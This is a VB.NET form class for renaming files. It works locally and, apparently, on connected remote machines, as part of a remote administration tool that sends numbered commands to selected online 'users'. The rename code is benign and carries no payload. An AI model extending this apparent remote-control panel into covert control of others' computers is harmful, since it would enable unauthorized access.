Imports System.IO

Public Class FilemanagerRenameFile

    Private Sub ButtonCancel_Click(sender As Object, e As EventArgs) Handles ButtonCancel.Click
        Me.Close()
    End Sub

    Private Sub ButtonRenameFile_Click(sender As Object, e As EventArgs) Handles ButtonRenameFile.Click
        Dim InvalidChars() As String = {"|", ";", "&", "<", ">", "*", "/", "\", ":", "{", "}", "[", "]"}
        If TextBoxRenameFile.Text = String.Empty Then
            MsgBox("Enter a valid file name.", MsgBoxStyle.Exclamation)
            Exit Sub
        End If
        For Each c As String In InvalidChars
            If TextBoxRenameFile.Text.Contains(c) Then
                MsgBox("Enter a valid file name.", MsgBoxStyle.Exclamation)
                Exit Sub
            End If
        Next

        If Filemanager.RenameFileLocal = True Then
            Try
                My.Computer.FileSystem.RenameFile(Filemanager.TextBoxLocalAdressBar.Text, TextBoxRenameFile.Text)
                MsgBox("File renamed with success.", MsgBoxStyle.Information)
                Filemanager.ListViewLocalFiles.SelectedItems(0).Text = TextBoxRenameFile.Text
                Me.Close()
            Catch ex As UnauthorizedAccessException
                MsgBox("Failed renaming file. Access is denied.", MsgBoxStyle.Critical)
                Me.Close()
            Catch ex As Exception
                MsgBox("Failed renaming file.", MsgBoxStyle.Critical)
                Me.Close()
            End Try
        Else
            If Main.ListViewMain.Items.Count > 0 Then
                If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                    Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
            Else
                MsgBox("No Users online.", MsgBoxStyle.Exclamation)
            End If
            Try
                Main.WriteData(Filemanager.TextBoxRemoteAdressBar.Text & "|||" & TextBoxRenameFile.Text)
                Main.WriteCommand(Main.SelectedUserID & "|30")
                Waiting.ShowDialog()
            Catch x As Exception
                MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "rename file")
            End Try
        End If

    End Sub
End Class